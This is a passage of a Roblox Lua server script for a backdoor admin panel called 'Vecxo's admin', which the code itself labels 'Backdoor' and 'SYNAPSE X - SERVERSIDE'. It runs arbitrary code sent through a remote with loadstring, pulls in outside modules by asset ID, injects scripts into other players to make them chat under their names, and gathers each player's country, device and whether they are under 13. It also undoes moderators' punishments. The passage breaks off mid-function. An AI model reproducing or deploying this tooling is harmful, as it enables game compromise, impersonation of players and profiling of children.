				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Command Bar"):Clone().Parent = sender:WaitForChild("PlayerGui")
			end
			return
		end

		local success, err = pcall(function()
			require(100506488790924).load("Command Bar")
		end)

		if err then
			notfi(sender, "Vecxo's admin", "Command bar failed to load: ", err)
		else
			if sender.PlayerGui then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Command Bar"):Clone().Parent = sender.PlayerGui
			else
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Command Bar"):Clone().Parent = sender:WaitForChild("PlayerGui")
			end
		end
	end
})

addcmd({
	Name = "cmds",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			gui(plr, "cmdlist")
		end
	end
})

-------------------------------------------- FUNCTIONS --------------------------------------------

cxoconnections["Scanner"] = function()
	local remote = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder"):WaitForChild("cxo's Device Remote")
	if remote then
		remote.OnServerInvoke = function(plr, device)
			for i, emoji in ipairs(emojis) do
				if string.find(device, emoji) then
					googul[plr.UserId] = device
				end
			end
		end
	end
end

cxoconnections["Device"] = function(player)
	if not googul[player.UserId] then
		if player and player.Character then
			local scr = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device LocalScript")
			if scr then
				scr:Clone()

				if player and player.Character then
					scr.Parent = player.Character
					return
				else
					if player then
						scr.Parent = player:WaitForChild("PlayerGui")
					end
				end

			else
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr

				scr:WaitForChild("Exec").Value = [[

				local UserInputService = game:GetService("UserInputService")
				local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
			
				local devices = {
					TouchEnabled = UserInputService.TouchEnabled,
					VREnabled = UserInputService.VREnabled,
					GamepadEnabled = UserInputService.GamepadEnabled,
					MouseEnabled = UserInputService.MouseEnabled,
					KeyboardEnabled = UserInputService.KeyboardEnabled
				}
			
				local device = ""
			
				if devices.VREnabled then
					device = device .. "ü•Ω + "
				end
				if devices.GamepadEnabled then
					device = device .. "üéÆ + "
				end
				if devices.TouchEnabled then
					device = device .. "üì± + "
				end
				if devices.MouseEnabled and devices.KeyboardEnabled then
					device = device .. "‚å®Ô∏èüñ±Ô∏è + "
				elseif devices.MouseEnabled then
					device = device .. "üñ±Ô∏è + "
				elseif devices.KeyboardEnabled then
					device = device .. "‚å®Ô∏è + "
				end
			
				if device:sub(-3) == " + " then
					device = device:sub(1, -4)
				end
			
				if device == "" then
					device = "‚ùì"
				end
			
				if remote then
					remote:InvokeServer(device)
				end
			
				]]

				if player and player.Character then
					scr.Parent = player.Character
				else
					if player then
						scr.Parent = player:WaitForChild("PlayerGui")
					end
				end

				scr.Name = "cxo's Device LocalScript"
				scr.Enabled = true
			end
			repeat task.wait() until googul[player.UserId]
			return googul[player.UserId]
		else
			return "‚ùì"
		end
	else
		return googul[player.UserId]
	end
end

cxoconnections["Gmod"] = function()
	local r = game:GetService("ReplicatedStorage")
	local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
	local grabbed = {}
	local grabbing

	remote.OnServerEvent:Connect(function(player, action, target)

		if not table.find(gmodded, player.UserId) then
			notfi(player, "Vecxo's admin", "This remote is protected.")
			return
		end

		if action == "Pickup" and table.find(gmodded, player.UserId) then
			if target and target:IsA("BasePart") and target.Anchored == false then
				grabbed[player] = target
				grabbing = target
				print(target.Name)
				target:SetNetworkOwner(player)
			end
		elseif action == "Update" and table.find(gmodded, player.UserId) then
			if grabbed[player] then
				local part = grabbed[player]
				if part then
					part.CFrame = CFrame.new(target)
				end
			end
		elseif action == "Release" and table.find(gmodded, player.UserId) then
			local part = grabbing
			grabbed[player] = nil

			local character = part.Parent
			if character and character:FindFirstChild("Humanoid") then
				for i,v in pairs(character:GetChildren()) do
					if v:IsA("BasePart") and v.Name == "Torso" or v.Name == "HumanoidRootPart" then
						print("who up joycatting rn | ".. v.Name)
						v:SetnetworkOwner(character)
					end
				end
			else
				part:SetNetworkOwner(nil)
			end
		end

	end)
end

cxoconnections["RemoteListener"] = function()

	local remote = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder"):WaitForChild("cxo's remote")

	remote.OnServerEvent:Connect(function(player, choice, command, target, target2, extra, extra2)

		if not table.find(panelanticheat, player.UserId) and not table.find(synapsex, player.UserId) and not table.find(chatter, player.UserId) and not table.find(iyed, player.UserId) and not table.find(cmdbared, player.UserId) and not table.find(chathacker, player.UserId) then
			notfi(player, "Vecxo's admin", "This remote is protected.")
			return
		end

		if choice == "chat hax" then
			plr = target
			if _G.sudo then
				--notfi(sender, "Vecxo's admin", "This command is currently patched!")
				_G.sudo(plr.Name, extra, "all")
			else
				if _G.say and typeof(_G.say) == "function" then
					_G.say(plr.Name, extra)
					return
				else
					_G.say = function(p, m)
						p = game.Players:FindFirstChild(p)
						if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
							local ticking = tick()
							require(112354705578311).load() -- goog readder
							repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
						end

						local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

						if not goog then
							warn("goog failed to be added, command can not continue")
							notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
							return
						end

						local scr = goog:FindFirstChild("Utilities").Client:Clone()
						local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

						loa.Parent = scr
						scr:WaitForChild("Exec").Value = string.format([[

							game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("%s")

							script:Destroy()

						]], m)

						if p.Character then
							scr.Parent = p.Character
						else
							scr.Parent = p:WaitForChild("PlayerGui")
						end

						scr.Enabled = true
					end
					_G.say(plr.Name, extra)
				end
			end
		end

		if choice == "cmdbar" then
			msg = command

			if table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then

				if msg:sub(1, #_G.prefix) == _G.prefix then
					msg = msg:sub(#_G.prefix + 1)
				end

				local parts = msg:split(" ")
				local cmdname = parts[1]

				local command = cmds[cmdname]
				if not command then
					for i, cmd in pairs(cmds) do
						if table.find(cmd.Data.Aliases, cmdname) then
							command = cmd
							break
						end
					end
				end

				if command then
					local playerless = command.Data.Player
					local target
					local args

					if playerless then
						target = parts[2] or "me"
						args = {table.unpack(parts, 3)}
					else
						target = nil
						args = {table.unpack(parts, 2)}
					end

					local targets = playerless and p(target, player) or nil
					command.Data.Function(player, targets, args)
				else
					notfi(player, "Vecxo's admin", "Command '" .. cmdname .. "' was not found.")
				end
			else
				return
			end
		end

		if choice == "F3X" then
			require(2571067295).load(player.Name)
		end

		if choice == "Reload" then
			--[[local whatdasus

			whatdasus = game.Players.ChildAdded:Connect(function(v)
				if v.Name == player.Name then
					plr = game.Players:WaitForChild(player.Name)
					if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("IY") then
						if plr.Character then
							game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.Character
						else
							game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.PlayerGui
						end
						return
					end

					local success, err = pcall(function()
						--require(14035238433)(plr.Name)
						require(100506488790924).load("IY")
					end)

					if err then
						notfi(plr, "Vecxo's admin", "IY FE failed to load")
					else
						if plr.Character then
							game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.Character
						else
							game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.PlayerGui
						end
					end
					whatdasus:Disconnect()
				end
			end)]]

		end

		if choice == "chat" then

			if extra2 == "" or extra2 == " " then
				return
			end

			if player.Character and player.Character:FindFirstChild("Head") then
				game:GetService("Chat"):Chat(player.Character.Head, extra2, Enum.ChatColor.White)
			end

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(player, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr

			if extra == "public" then
				scr:WaitForChild("Exec").Value = string.format([[

				game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):DisplaySystemMessage("[%s]: %s")


				]], player.DisplayName, extra2)
				for i,v in pairs(game.Players:GetPlayers()) do
					if v.Character then
						local sc = scr:Clone()
						sc.Parent = v.Character
						sc.Enabled = true
					else
						local sc = scr:Clone()
						sc.Parent = v.PlayerGui
						sc.Enabled = true
					end
				end
			end

			if extra == "whisper" then -- was gonna make this work but im too lazy
				scr:WaitForChild("Exec").Value = string.format([[

				game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):DisplaySystemMessage("[Whisper From %s]: %s")

				script:Destroy()

				]], player.Name, extra2)
				p = game.Players:FindFirstChild(target)
				if p then
					if p.Character then
						scr.Parent = p.Character
					else
						scr.Parent = p.PlayerGui
					end
				end
			end
		end

		if choice == "dex" then
			require(15827159924).MauDex(player.Name)
			return
		end

		if choice == "Code" then
			if extra == "SERVER" then
				if table.find(_G.Whitelist, tostring(player.UserId)) then
					print("[SYNAPSE X - SERVERSIDE]: ".. extra2)
					loadstring(extra2)()
				end
			elseif extra == "CLIENT" then
				print("[SYNAPSE X - CLIENT]: ".. extra2)
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = string.format([[

					%s

				]], extra2)

				if player.PlayerGui then
					scr.Parent = player.PlayerGui
				else
					if player.Character then
						scr.Parent = player.Character
					end
				end

				scr.Name = "CODE"
				scr.Enabled = true
			end
		end

		if choice == "PanelCMD" and table.find(panelanticheat, player.UserId) then

			if not table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
				notfi(player, "Vecxo's admin", "You must be whitelisted to use this!")
				return
			end

			if target == nil then
				target = player.Name
			end

			if target == "me" then
				target = player.Name
			elseif target2 == "me" then
				target2 = player.Name
			end

			local argt = p(target, player)
			local argt2 = p(target2, player)

			if #argt > 0 then
				target = argt[1]
			else
				target = nil
			end

			if #argt2 > 0 then
				target2 = argt2[1]
			else
				target2 = nil
			end

			if command:lower() ~= "chat" then
				extra = nil
			else
				if target2 then
					target2 = nil
				end
			end

			if target2 and target2 ~= nil then
				--print("Running command with two targets: " .. target .. ", " .. target2 .. " | Command: " .. command)
				runcmd(command, nil, {target, target2}, {extra}, nil)
				--(cmdn,message,targets,arguments,extra)
			elseif target and target ~= nil then
				if command:lower() == "chat" then
					print(extra)
					_G.sudo(game.Players:FindFirstChild(target), extra , "all")
					--print("Running chat with one target: " .. player.Name .. " | Command: " .. command .. " | Msg: ".. extra)
					return
				else
					--print("Running command with one target: " .. target .. " | Command: " .. command)
					runcmd(command, nil, {target}, extra)
				end
			else
				if command:lower() == "chat" then
					_G.sudo(player, {extra} , "all")
					--print("Running chat with one target: " .. player.Name .. " | Command: " .. command .. " | Msg: ".. extra)
					return
				else
					--print("Running command with only the player: " .. player.Name .. " | Command: " .. command)
					runcmd(command, nil, {player}, {extra}, nil)
				end
			end
		elseif choice == "INFO" then

			local argt, argt2

			if target == nil or target == "me" then
				target = player
			end

			if target2 == "me" then
				print("bleh")
				target2 = player
			end

			if typeof(target) == "string" then
				argt = p(target, player)
				if #argt > 0 then
					target = argt[1]
				else
					notfi(player, "Vecxo's admin", "Player not found!")
					return
				end
			end

			if target2 and typeof(target2) == "string" then
				argt2 = p(target2, player)
				print("Looking for:", target2)
				print("Found players:", #argt2)
				if #argt2 > 0 then
					target2 = argt2[1]
				else
					notfi(player, "Vecxo's admin", "Player not found!")
					return
				end
			end

			print(target, typeof(target))
			print(target.Name)

			if target and target ~= nil then

				local abc, def, ghi, jkl, mno

				if table.find(_G.Whitelist, tostring(target.UserId)) or table.find(TempWhitelist, target.UserId) then
					abc = "true"
				else
					abc = "false"
				end

				if target.MembershipType == Enum.MembershipType.Premium then
					def = "true"
				else
					def = "false"
				end

				if table.find(_G.specialperms, target.Name) then
					ghi = "true"
				else
					ghi = "false"
				end

				if table.find(_G.permadmins, target.Name) then
					jkl = "true"
				else
					jkl = "false"
				end

				if table.find(_G.p299, target.Name) then
					mno = "true"
				else
					mno = "false"
				end

				local t1l = player:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
				local i1l = player:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_1_Frame"):FindFirstChild("ImageLabel")
				t1l.Text = "Display: ".. target.DisplayName .."\nUserId: ".. target.UserId .."\nAccount Age: ".. target.AccountAge .."\nWhitelisted: ".. abc .."\nPremium: ".. def .."\nBackdoor: ".. ghi .."\nPerm: ".. jkl .."\nP299: ".. mno
				i1l.Image = "rbxthumb://type=Avatar&id=".. target.UserId .."&w=420&h=420"

			elseif target2 ~= nil then

				local abc, def, ghi, jkl, mno

				if table.find(_G.Whitelist, tonumber(target2.UserId)) or table.find(TempWhitelist, target2.UserId) then
					abc = "true"
				else
					abc = "false"
				end

				if target2.MembershipType == Enum.MembershipType.Premium then
					def = "true"
				else
					def = "false"
				end

				if table.find(_G.specialperms, target2.Name) then
					ghi = "true"
				else
					ghi = "false"
				end

				if table.find(_G.permadmins, target2.Name) then
					jkl = "true"
				else
					jkl = "false"
				end

				if table.find(_G.p299, target2.Name) then
					mno = "true"
				else
					mno = "false"
				end

				local t2l = player:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_Frame"):FindFirstChild("ImageLabel"):FindFirstChild("TextLabel")
				local i2l = player:WaitForChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Player_2_Frame"):FindFirstChild("ImageLabel")
				t2l.Text = "Display: ".. target2.DisplayName .."\nUserId: ".. target2.UserId .."\nAccount Age: ".. target2.AccountAge .."\nWhitelisted: ".. abc .."\nPremium: ".. def .."\nBackdoor: ".. ghi .."\nPerm: ".. jkl .."\nP299: ".. mno
				i2l.Image = "rbxthumb://type=Avatar&id=".. target2.UserId .."&w=420&h=420"
			end
		elseif choice == "SUDO" then
			local success, fail = pcall(function()
				require(97248613655645).Run()
				notfi(player, "Vecxo's admin", "Inserting _G.sudo", 3)
			end)
			task.spawn(function()
				task.wait(5)
				if not success then
					notfi(player, "Vecxo's admin", "Failed to insert _G.sudo: " .. fail)
					for i,v in pairs(game.Players:GetPlayers()) do
						if v.PlayerGui and v.PlayerGui:FindFirstChild("Vecxo's admin GUI") then
							if v:FindFirstChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo") then
								v:FindFirstChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo"):Destroy()
								v:FindFirstChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Sudo").TextColor3 = Color3.fromRGB(255, 0, 0)
							end
						end
					end
					return
				else
					notfi(player, "Vecxo's admin", "_G.sudo has been inserted.", 2)
					for i,v in pairs(game.Players:GetPlayers()) do
						if v.PlayerGui and v.PlayerGui:FindFirstChild("Vecxo's admin GUI") then
							if v:FindFirstChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo") then
								v:FindFirstChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo"):Destroy()
								v:FindFirstChild("PlayerGui"):FindFirstChild("Vecxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Sudo").TextColor3 = Color3.fromRGB(0, 255, 0)
							end
						end
					end
				end
			end)
		end
	end)
end

cxoconnections["RemoteFListener"] = function()
	local Remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's remotefunction")
	local function GetFlag(code)
		if code:upper() == "XK" then
			return "üè≥Ô∏è" -- kosovo aint got a flag (Korabi: Why do i not have a flag!?)
		end

		local flag = ""

		for i = 1, #code do
			flag = flag .. utf8.char(utf8.codepoint("üá¶") + string.byte(code:upper():sub(i, i)) - string.byte("A"))
		end

		return flag
	end

	Remote.OnServerInvoke = function(lp, p, r)
		if lp.PlayerGui and lp.PlayerGui:FindFirstChild("cxo's chat hax") then
			local age = nil
			local whitelisted = "False"
			local backdoor = "False"
			local perm = "False"
			local persons = "False"

			if r == "flag" then
				local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), p)
				if success and code then
					return GetFlag(code)
				else
					return "Error"
				end
			end

			if lp.Name ~= p.Name then
				local success, chat = pcall(function()
					return game:GetService("TextChatService"):CanUsersDirectChatAsync(lp.UserId, { p.UserId })
				end)

				if success then
					if #chat > 0 then
						age = "13+"
					else
						age = "<13"
					end
				else
					age = "Error"
				end
			else
				age = "Error"
			end

			if table.find(_G.Whitelist, tostring(p.UserId)) then
				whitelisted = "Permanent"
			elseif table.find(TempWhitelist, p.UserId) then
				whitelisted = "Temporary"
			end

			if table.find(_G.specialperms, p.Name) then
				backdoor = "True"
			end

			if table.find(_G.permadmins, p.Name) then
				perm = "True"
			end

			if table.find(_G.p299, p.Name) then
				persons = "True"
			end

			return "Name: ".. p.Name .."\nDisplay: ".. p.DisplayName .."\nID: ".. p.UserId .."\nAge: ".. age .."\nAccount Age: ".. p.AccountAge .."\nWhitelisted: ".. whitelisted .."\nBackdoor: ".. backdoor .."\nPerm: ".. perm .."\nPersons: ".. persons 
		end
	end
end

cxoconnections["ftag"] = function()
	coroutine.resume(coroutine.create(function()
		local r, g, b = 255, 0, 0
		local team
		while tag == true do

			if not game.Teams:FindFirstChild("! cxo's admin is loaded !") and not game.Teams:FindFirstChild("cxo's admin is loaded") then
				team = Instance.new("Team", game.Teams)
				team.Name = "cxo's admin is loaded"
				team.AutoAssignable = false
			end

			for i = 0, 255, 5 do
				r, b = r - 5, b + 5
				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
				team.Name = "! cxo's admin is loaded !"
				task.wait()
			end
			for i = 0, 255, 5 do
				g = g + 5
				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
				team.Name = "cxo's admin is loaded"
				task.wait()
			end
			for i = 0, 255, 5 do
				b = b - 5
				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
				team.Name = "! cxo's admin is loaded !"
				task.wait()
			end
			for i = 0, 255, 5 do
				r = r + 5
				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
				team.Name = "cxo's admin is loaded"
				task.wait()
			end
			for i = 0, 255, 5 do
				g = g - 5
				team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
				team.Name = "! cxo's admin is loaded !"
				task.wait()
			end
		end
	end))
end

--//Vecko's anti additions :D

cxoconnections["AntiPunish3"] = function(Player: Player)
	if not Player then return end
	AutoUnpunish[Player.Name] = true
	Player.CharacterAdded:Connect(function(char)
		char.AncestryChanged:Connect(function(_, parent)
			if parent == game.Lighting and AutoUnpunish[Player.Name] then
				warn("[AntiPunish]: Detected punish on " .. Player.Name .. ", reverting...")
				char.Parent = workspace
			end
		end)
	end)
	if Player.Character and Player.Character.Parent == game.Lighting then
		Player.Character.Parent = workspace
	end
end
--[[ Decryptionite made a betr antikill 4 this script so i used it thx decryptionite#1337 ]]
cxoconnections["AntiKill"] = function(Character:Model)
	if Character and Character:FindFirstChild("HumanoidRootPart") then
		local DeathPosition = Character.HumanoidRootPart.CFrame

		if AutoRespawn[Character.Name] then

			local Player = game.Players[Character.Name]
			Player:LoadCharacter()

			Player.Character:WaitForChild("HumanoidRootPart",3)
			Player.Character.HumanoidRootPart.CFrame = DeathPosition

		end
	end
end

cxoconnections["AntiKill2"] = function(Character:Model)

	Character.Humanoid.Died:Once(function()

		cxoconnections["AntiKill"](Character)
	end)

end

cxoconnections["AntiKill3"] = function(Player:Player)

	if not Player then
		return
	end

	AutoRespawn[Player.Name] = Player.CharacterAdded:Connect(cxoconnections["AntiKill2"])

	-- For their current character.
	cxoconnections["AntiKill2"](Player.Character)

end
--[[
function antikill(plr)
	task.spawn(function()
		local antikillering
		local rnpos
		if plr.Character and plr.Character:FindFirstChild("Humanoid") then
			plr.Character.Humanoid.Died:Connect(function()
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and table.find(autore, plr.Name) then
					rnpos = plr.Character.HumanoidRootPart.CFrame
					plr:LoadCharacter()
					repeat task.wait() until plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") or not game.Players:FindFirstChild(plr.Name)
					plr.Character.HumanoidRootPart.CFrame = rnpos
				end
			end)
	
			antikillering = plr.CharacterAdded:Connect(function()
				if table.find(autore, plr.Name) then
					repeat task.wait() until plr and plr.Character or not game.Players:FindFirstChild(plr.Name)
					antikill(plr)
					antikillering:Disconnect()
				end
			end)
		else
			plr.CharacterAdded:Wait()
			antikill(plr)
		end
	end)
end
]]

cxoconnections["Create"] = function(plr, parent, amount, sizeX, sizeY, sizeZ)
	local cfgs = plrcfgs[plr.Name]
	for i = 1, amount do
		local part = Instance.new("Part")
		part.Name = "vis" .. i
		part.Size = Vector3.new(sizeX, sizeY, sizeZ)
		part.Anchored = true
		part.CanCollide = false
		part.Locked = true
		part.Material = Enum.Material[cfgs.material] or Enum.Material.Plastic
		part.Color = Color3.fromRGB(cfgs.colourR, cfgs.colourG, cfgs.colourB)
		part.Parent = parent
		table.insert(plrparts[plr.Name], part)
	end
end

cxoconnections["Updatec"] = function(plr)
	local cfgs = plrcfgs[plr.Name]

	if not plrparts[plr.Name] then
		warn("Error: No parts found for " .. plr.Name)
		return
	end

	local parts = plrparts[plr.Name]

	if #parts < tonumber(cfgs.amount) then
		for i, part in pairs(workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")")) do
			part:Destroy()
		end
		cxoconnections["Create"](plr, workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")"), cfgs.amount, cfgs.sizeX, cfgs.sizeY, cfgs.sizeZ)
	end

	for i, part in pairs(parts) do
		part.Size = Vector3.new(tonumber(cfgs.sizeX), tonumber(cfgs.sizeY), tonumber(cfgs.sizeZ))
	end

	if cfgs.seat == true or cfgs.seat == "true" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Seat") then
				local Seat = Instance.new("Seat")
				local w = Instance.new("Weld", Seat)
				w.Part0 = part
				w.Part1 = Seat
				Seat.Anchored = false
				Seat.Parent = part
				Seat.Locked = true
				Seat.Transparency = 1
				Seat.Name = "Seat"
			end
		end
	elseif cfgs.seat == false or cfgs.seat == "false" then
		for i, part in pairs(parts) do
			if part:FindFirstChild("Seat") then
				part.Seat:Destroy()
			end
		end
	end

	if cfgs.mode == "rainbow" then
		cfgs.hue = (cfgs.hue + 5) % 360
		local colour3 = Color3.fromHSV(cfgs.hue / 360, 1, 1)
		for i, part in pairs(parts) do
			if #part:GetChildren() >= 1 then
				for i,v in pairs(part:GetChildren()) do
					if v.Name ~= "Seat" then
						v:Destroy()
					end
				end
			end
			part.Material = cfgs.material
			part.Reflectance = cfgs.reflectance
			part.Transparency = cfgs.transparency
			part.Color = colour3
		end
	elseif cfgs.mode == "heart" then
		for i, part in pairs(parts) do
			if #part:GetChildren() >= 1 then
				for i,v in pairs(part:GetChildren()) do
					if v.Name ~= "Seat" then
						v:Destroy()
					end
				end
			end
			part.Material = cfgs.material
			part.Reflectance = cfgs.reflectance
			part.Transparency = cfgs.transparency
			part.Color = Color3.fromRGB(255, 0, 0)
			cfgs.spin = false
			cfgs.amount = 40
		end
	elseif cfgs.mode == "flicker" then
		cfgs.colour = not cfgs.colour
		local colour3 = cfgs.colour and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
		for i, part in pairs(parts) do
			if #part:GetChildren() >= 1 then
				for i,v in pairs(part:GetChildren()) do
					if v.Name ~= "Seat" then
						v:Destroy()
					end
				end
			end
			part.Material = cfgs.material
			part.Reflectance = cfgs.reflectance
			part.Transparency = cfgs.transparency
			part.Color = colour3
		end
	elseif cfgs.mode == "maxwell" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("maxwell") then
				if #part:GetChildren() >= 1 then
					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("maxwell") then
					local maxwell = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("maxwell"):Clone()
					local w = Instance.new("Weld", maxwell)
					w.Part0 = part
					w.Part1 = maxwell
					maxwell.Anchored = false
					maxwell.forgor.Anchored = false
					maxwell.Parent = part
					maxwell.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("maxwell") then
					local maxwell = game:GetService("ReplicatedStorage"):FindFirstChild("maxwell"):Clone()
					local w = Instance.new("Weld", maxwell)
					w.Part0 = part
					w.Part1 = maxwell
					maxwell.Anchored = false
					maxwell.forgor.Anchored = false
					maxwell.Parent = part
					maxwell.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("maxwell")
					local maxwell = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("maxwell"):Clone()
					local w = Instance.new("Weld", maxwell)
					w.Part0 = part
					w.Part1 = maxwell
					maxwell.Anchored = false
					maxwell.forgor.Anchored = false
					maxwell.Parent = part
					maxwell.Locked = true
					part.Transparency = 1
				end
			end
		end
	elseif cfgs.mode == "doge" or cfgs.mode == "dog" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Doge") then
				if #part:GetChildren() >= 1 then
					for i,v in pairs(part:GetChildren()) do
						if v.Name ~= "Seat" then
							v:Destroy()
						end
					end
				end
				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Doge") then
					local Doge = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Doge"):Clone()
					local w = Instance.new("Weld", Doge)
					w.Part0 = part
					w.Part1 = Doge
					Doge.Anchored = false
					Doge.Parent = part
					Doge.Locked = true
					part.Transparency = 1
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Doge") then
					local Doge = game:GetService("ReplicatedStorage"):FindFirstChild("Doge"):Clone()
					local w = Instance.new("Weld", Doge)
					w.Part0 = part
					w.Part1 = Doge
					Doge.Anchored = false
					Doge.Parent = part
					Doge.Locked = true
					part.Transparency = 1
				else
					require(100506488790924).load("Doge")
					local Doge = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Doge"):Clone()
					local w = Instance.new("Weld", Doge)
					w.Part0 = part
					w.Part1 = Doge
					Doge.Anchored = false
					Doge.Parent = part
					Doge.Locked = true
					part.Transparency = 1
				end
			end
		end
	elseif cfgs.mode == "ben" then
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Ben") then
				if #part:GetChildren() >= 1 then
